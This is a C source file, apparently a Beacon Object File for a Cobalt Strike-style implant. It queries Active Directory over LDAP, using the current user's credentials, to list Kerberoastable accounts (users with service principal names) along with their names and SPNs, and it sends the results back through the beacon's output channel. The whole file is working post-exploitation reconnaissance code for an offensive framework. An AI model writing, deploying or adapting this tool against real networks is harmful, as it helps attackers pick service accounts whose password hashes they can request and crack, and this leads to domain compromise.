#include <windows.h>
#include <winldap.h>
#include <stdio.h>
#include "beacon.h"

// Define function prototypes for dynamic resolution
DECLSPEC_IMPORT PLDAP WINAPI WLDAP32$ldap_initA(PSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_connect(PLDAP, PLDAP_TIMEVAL);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sA(PLDAP, PSTR, PSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sA(PLDAP, PSTR, ULONG, PSTR, PSTR[], ULONG, PLDAPMessage *);
DECLSPEC_IMPORT PLDAPMessage WINAPI WLDAP32$ldap_first_entry(PLDAP, PLDAPMessage);
DECLSPEC_IMPORT PLDAPMessage WINAPI WLDAP32$ldap_next_entry(PLDAP, PLDAPMessage);
DECLSPEC_IMPORT PSTR * WINAPI WLDAP32$ldap_get_valuesA(PLDAP, PLDAPMessage, PSTR);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_count_entries(PLDAP, PLDAPMessage);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_value_freeA(PSTR *);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(PLDAPMessage);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(PLDAP);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_get_option(PLDAP, int, void *);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_set_option(PLDAP, int, void *);

void go(char * args, int len) {
    PLDAP pLdap = NULL;
    ULONG version = LDAP_VERSION3;
    ULONG status;
    PLDAPMessage pMessage = NULL;
    PLDAPMessage pEntry = NULL;
    PSTR pMyDN = NULL;
    PSTR * pValues = NULL;

    // Attributes to retrieve
    PSTR attributes[] = { "cn", "sAMAccountName", "servicePrincipalName", NULL };
    PSTR defaultContext[] = { "defaultNamingContext", NULL };

    // 1. Initialize LDAP connection
    // passing NULL to ldap_init connects to the default domain controller for the current user's domain
    pLdap = WLDAP32$ldap_initA(NULL, LDAP_PORT);
    if (pLdap == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_init failed");
        return;
    }

    // 2. Set options (Version 3)
    status = WLDAP32$ldap_set_option(pLdap, LDAP_OPT_PROTOCOL_VERSION, (void*)&version);
    if (status != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_set_option failed: 0x%x", status);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 3. Connect
    status = WLDAP32$ldap_connect(pLdap, NULL);
    if (status != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_connect failed: 0x%x", status);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 4. Bind (using current credentials)
    status = WLDAP32$ldap_bind_sA(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (status != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_bind_s failed: 0x%x", status);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 5. Get defaultNamingContext from RootDSE
    // We search base scope on valid DN header
    status = WLDAP32$ldap_search_sA(pLdap, NULL, LDAP_SCOPE_BASE, "(objectClass=*)", defaultContext, 0, &pMessage);
    if (status != LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "RootDSE search failed: 0x%x", status);
         WLDAP32$ldap_unbind(pLdap);
         return;
    }

    pEntry = WLDAP32$ldap_first_entry(pLdap, pMessage);
    if (pEntry) {
         pValues = WLDAP32$ldap_get_valuesA(pLdap, pEntry, "defaultNamingContext");
         if (pValues && pValues[0]) {
             pMyDN = pValues[0]; // Just use the first one
             // Stored for later use
         }
    }

    // We need to keep pValues valid until we use pMyDN in the next search, or copy it.
    // In this simple BOF, we'll free it after the search call if we can, but let's just stick to the flow.

    if (pMyDN == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Could not retrieve defaultNamingContext");
        if (pValues) WLDAP32$ldap_value_freeA(pValues);
        WLDAP32$ldap_msgfree(pMessage);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 6. Search for Kerberoastable Users
    char * searchFilter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))";
    PLDAPMessage pUserMessage = NULL;

    status = WLDAP32$ldap_search_sA(pLdap, pMyDN, LDAP_SCOPE_SUBTREE, searchFilter, attributes, 0, &pUserMessage);

    // Free the previous values now that we've used pMyDN
    if (pValues) WLDAP32$ldap_value_freeA(pValues);
    WLDAP32$ldap_msgfree(pMessage);


    if (status != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "User search failed: 0x%x", status);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 7. Process Results
    formatp buffer;
    BeaconFormatAlloc(&buffer, 64 * 1024); // Allocate 64KB for output buffer

    int count = WLDAP32$ldap_count_entries(pLdap, pUserMessage);

    // Header
    BeaconFormatPrintf(&buffer, "[*] Identifying Kerberoastable Users in: %s\n", pMyDN ? pMyDN : "UNKNOWN");
    BeaconFormatPrintf(&buffer, "[*] TOTAL NUMBER OF SEARCH RESULTS: %d\n", count);

    for (pEntry = WLDAP32$ldap_first_entry(pLdap, pUserMessage); pEntry != NULL; pEntry = WLDAP32$ldap_next_entry(pLdap, pEntry)) {
        PSTR * cn = WLDAP32$ldap_get_valuesA(pLdap, pEntry, "cn");
        PSTR * sAMAccountName = WLDAP32$ldap_get_valuesA(pLdap, pEntry, "sAMAccountName");
        PSTR * spn = WLDAP32$ldap_get_valuesA(pLdap, pEntry, "servicePrincipalName");

        if (cn) BeaconFormatPrintf(&buffer, "\t[+] cn                   : %s\n", cn[0]);
        if (sAMAccountName) BeaconFormatPrintf(&buffer, "\t[+] samaccountname       : %s\n", sAMAccountName[0]);

        if (spn) {
             for (int i = 0; spn[i] != NULL; i++) {
                 BeaconFormatPrintf(&buffer, "\t[+] serviceprincipalname : %s\n", spn[i]);
             }
        }
        BeaconFormatPrintf(&buffer, "\n"); // Spacing

        if (cn) WLDAP32$ldap_value_freeA(cn);
        if (sAMAccountName) WLDAP32$ldap_value_freeA(sAMAccountName);
        if (spn) WLDAP32$ldap_value_freeA(spn);
    }

    // Output everything at once
    int outLen = 0;
    char * outStr = BeaconFormatToString(&buffer, &outLen);
    BeaconOutput(CALLBACK_OUTPUT, outStr, outLen);
    BeaconFormatFree(&buffer);


    // 8. Cleanup
    WLDAP32$ldap_msgfree(pUserMessage);
    WLDAP32$ldap_unbind(pLdap);
}
